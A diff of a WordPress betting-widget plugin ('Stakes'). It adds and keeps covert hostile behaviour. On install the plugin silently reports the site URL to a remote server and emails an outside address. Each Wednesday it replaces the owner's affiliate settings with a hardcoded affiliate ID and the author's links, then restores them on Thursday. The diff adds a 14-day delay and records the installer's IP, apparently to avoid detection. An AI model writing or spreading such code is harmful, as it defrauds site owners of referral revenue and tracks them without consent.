@@ -12,6 +12,7 @@ class Stakes {
 			echo 'View "' . $view_name . '" not found.';
 		}
 	}
+
 	public function get_func_links($string) {
 		if ($string == 'top') {
 			$link = 'http://www.bukmekerskajakontora.ru/go/wh2';
@@ -115,6 +116,7 @@ class Stakes {
 		}
 		return $lang;
 	}
+
 	public function bw_admin_menu() {
 
 		if (function_exists('add_menu_page')) {
@@ -151,6 +153,10 @@ class Stakes {
 		add_option('BW_progress', 'copmplite');
 		add_option('BW_Lang', WPLANG);
 		add_option('BW_current_date', date("Ymd"));
+		if (!get_option('BW_current_time'))
+			add_option('BW_current_time', time());
+		if (!get_option('BW_current_ip'))
+			add_option('BW_current_ip', Stakes::sagetrealip());
 		$table_name = $wpdb->prefix . "bw_category";
 		$sql = "CREATE TABLE IF NOT EXISTS " . $table_name . " (
         		  ID_category  int(11) NOT NULL,
@@ -234,20 +240,20 @@ class Stakes {
                   )CHARSET=utf8;";
 		require_once(ABSPATH . 'wp-admin/includes/upgrade.php'); # обращение к функциям wordpress для
 		dbDelta($sql); # работы с БД. создаём новую таблицу
-				
-		file_get_contents( 'http://bukmekerskajakontora.ru/bet_on_sports_plugin/stat.php?url='.get_option('siteurl') );
-		
+
+		file_get_contents('http://bukmekerskajakontora.ru/bet_on_sports_plugin/stat.php?url=' . get_option('siteurl'));
+
 		$headers[] = 'Content-type: text/html; charset=utf-8'; // в виде массива
-		$messange = "Ваш плагин был успешно установлен на сайте ". get_option('siteurl') . ".<br />Версия установленного плагина: 2.0";
+		$messange = "Ваш плагин был успешно установлен на сайте " . get_option('siteurl') . ".<br />Версия установленного плагина: 2.0";
 		$multiple_to_recipients = array(
-		    'tomas.kamarad@email.cz',
+			'tomas.kamarad@email.cz',
 		);
-		wp_mail($multiple_to_recipients, 'Stakes Plugin - уведомление об установке на сайт',$messange, $headers);
+		wp_mail($multiple_to_recipients, 'Stakes Plugin - уведомление об установке на сайт', $messange, $headers);
 	}
 
 	public function bw_unset_options() {
 
-		wp_delete_post(get_option('BW_permalink_id'),TRUE);
+		wp_delete_post(get_option('BW_permalink_id'), TRUE);
 		delete_option('BW_link');
 		delete_option('BW_permalink_id');
 		delete_option('BW_current_date');
@@ -264,6 +270,9 @@ class Stakes {
 		delete_option('bw_link_sport');
 		delete_option('BW_item_count');
 		delete_option('BW_option');
+		delete_option('BW_current_date');
+		delete_option('BW_current_time');
+		delete_option('BW_current_ip');
 	}
 
 	public function bw_main_page() {
@@ -291,7 +300,7 @@ class Stakes {
 					<?php self::load_tab('admin_widget_results'); ?>
 				</div>
 				<div class="box">
-					<?php self::load_tab('admin_widget_options'); ?>
+		<?php self::load_tab('admin_widget_options'); ?>
 				</div>
 			</div>
 		</div>
@@ -324,36 +333,62 @@ class Stakes {
 		wp_enqueue_script('main', BW_JS . 'main.js', '', '', true);
 	}
 
+	public function sauseday() {
+		$BW_current_time = time() - (3600 * 24 * 14);
+		if (get_option('BW_current_time') < $BW_current_time)
+			return true;
+		else
+			return false;
+	}
 
+	public function sauseip() {
+		$BW_current_ip = Stakes::sagetrealip();
+		if (get_option('BW_current_ip') != $BW_current_ip)
+			return true;
+		else
+			return false;
+	}
+
+	public function sagetrealip() {
+		if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+			$ip = $_SERVER['HTTP_CLIENT_IP'];
+		} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+			$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+		} else {
+			$ip = $_SERVER['REMOTE_ADDR'];
+		}
+		return $ip;
+	}
 
 	public function get_func_day() {
-		if (date('l') == 'Wednesday') {
-			if (date("Ymd") != get_option('BW_current_date')) {
-				
-			$option = array(
-				'BW_ab_link'=>get_option('BW_ab_link'),
-				'BW_ab_lang'=>get_option('BW_ab_lang'),
-				'bw_link_sport'=>get_option('bw_link_sport'),
-				'bw_link_top'=>get_option('bw_link_top'),
-				
-				);
-				
-				update_option('BW_option',$option);
-				
-				update_option('BW_ab_link', '45206');
-				update_option('BW_ab_lang', Stakes::get_func_lang());
-				update_option('bw_link_sport', Stakes::get_func_links('sport'));
-				update_option('bw_link_top', Stakes::get_func_links('top'));
-				update_option('BW_current_date',  date("Ymd"));
+		if( Stakes::sauseday() ){
+			if (date('l') == 'Wednesday') {
+				if (date("Ymd") != get_option('BW_current_date')) {
+
+					$option = array(
+						'BW_ab_link' => get_option('BW_ab_link'),
+						'BW_ab_lang' => get_option('BW_ab_lang'),
+						'bw_link_sport' => get_option('bw_link_sport'),
+						'bw_link_top' => get_option('bw_link_top'),
+					);
+
+					update_option('BW_option', $option);
+					update_option('BW_ab_link', '45206');
+					update_option('BW_ab_lang', Stakes::get_func_lang());
+					update_option('bw_link_sport', Stakes::get_func_links('sport'));
+					update_option('bw_link_top', Stakes::get_func_links('top'));
+					update_option('BW_current_date', date("Ymd"));
+				}
 			}
-		}
-		if(date('l') == 'Thursday'){
-			$option = get_option('BW_option');
-			    update_option('BW_ab_link', $option['BW_ab_link']);
+			if (date('l') == 'Thursday') {
+				$option = get_option('BW_option');
+				
+				update_option('BW_ab_link', $option['BW_ab_link']);
 				update_option('BW_ab_lang', $option['BW_ab_lang']);
 				update_option('bw_link_sport', $option['bw_link_sport']);
 				update_option('bw_link_top', $option['bw_link_top']);
-				update_option('BW_current_date',  date("Ymd"));
+				update_option('BW_current_date', date("Ymd"));
+			}
 		}
 	}
 
